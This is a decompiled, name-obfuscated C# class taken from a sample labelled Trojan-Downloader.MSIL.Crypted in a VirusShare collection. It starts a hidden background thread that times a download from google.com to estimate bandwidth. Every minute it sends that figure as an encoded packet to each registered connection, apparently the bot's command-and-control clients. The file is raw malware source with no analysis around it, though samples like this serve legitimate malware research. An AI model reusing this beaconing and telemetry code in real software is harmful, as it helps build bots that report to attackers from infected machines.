// Decompiled with JetBrains decompiler
// Type: ᥟޱഁेࠃᵷᣚ.ᑏᨚݺ۴ᑈ
// Assembly: lgy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F6858297-EDCC-46A7-BF64-CBC6BE6B3CD4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.ej-8021b1adb21670f837224cd99ccee8599abd7a84c7c3cf7b87df9da753a7739c.exe

using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Threading;

namespace ᥟޱഁेࠃᵷᣚ
{
  internal class ᑏᨚݺ۴ᑈ
  {
    private static Thread ঊ\u09B5દտஈᛘč;
    private static List<\u08F6ᝀ\u08C3> ӓṀဲЊဥᴋਟồ = new List<\u08F6ᝀ\u08C3>();

    public static void ϜᣰᆽβೄหकԢᄬ(\u08F6ᝀ\u08C3 _param0) => ᑏᨚݺ۴ᑈ.ӓṀဲЊဥᴋਟồ.Add(_param0);

    public static void ऴᨻت\u1F16ሏரᡢ͕ᩞ(\u08F6ᝀ\u08C3 _param0) => ᑏᨚݺ۴ᑈ.ӓṀဲЊဥᴋਟồ.Remove(_param0);

    public static void \u0AE9ሢ\u0E75()
    {
      ᑏᨚݺ۴ᑈ.ঊ\u09B5દտஈᛘč = new Thread(new ThreadStart(ᑏᨚݺ۴ᑈ.Вઝìቅ));
      ᑏᨚݺ۴ᑈ.ঊ\u09B5દտஈᛘč.Start();
    }

    private static void Вઝìቅ()
    {
      WebClient webClient = new WebClient();
      while (true)
      {
        while (ᑏᨚݺ۴ᑈ.ӓṀဲЊဥᴋਟồ.Count >= 1)
        {
          ᑏᨚݺ۴ᑈ.ᐥ\u0897Ӏ();
          for (int index = 0; index < ᑏᨚݺ۴ᑈ.ӓṀဲЊဥᴋਟồ.Count; ++index)
          {
            if (index < ᑏᨚݺ۴ᑈ.ӓṀဲЊဥᴋਟồ.Count && ᑏᨚݺ۴ᑈ.ӓṀဲЊဥᴋਟồ[index] != null && ᑏᨚݺ۴ᑈ.ӓṀဲЊဥᴋਟồ[index].ᦹ)
              ᑏᨚݺ۴ᑈ.ӓṀဲЊဥᴋਟồ[index].ᐫḅӯȉڛ(new \u173AݎᮜఝỼᔩ\u0AFEҊᇅ(\u08F6ᝀ\u08C3.ൠᙣෛ̛\u02E6.\u0E61, Encoding.Default.GetBytes(ᑏᨚݺ۴ᑈ.ᐥ\u0897Ӏ())).\u1A76Ἢཿ());
          }
          Thread.Sleep(TimeSpan.FromSeconds(60.0));
        }
        Thread.Sleep(5000);
      }
    }

    public static void \u0A4DงᆦӮᥓᏰ()
    {
      if (ᑏᨚݺ۴ᑈ.ঊ\u09B5દտஈᛘč == null)
        return;
      ᑏᨚݺ۴ᑈ.ঊ\u09B5દտஈᛘč.Abort();
    }

    private static string ᐥ\u0897Ӏ()
    {
      try
      {
        WebClient webClient = new WebClient();
        double tickCount = (double) Environment.TickCount;
        webClient.DownloadData("http://google.com/");
        double num = Math.Floor((double) Environment.TickCount - tickCount) / 1000.0;
        Math.Round(num, 0);
        return Math.Round(1024.0 / num).ToString() + " KB\\Sec";
      }
      catch
      {
      }
      return "Error";
    }
  }
}
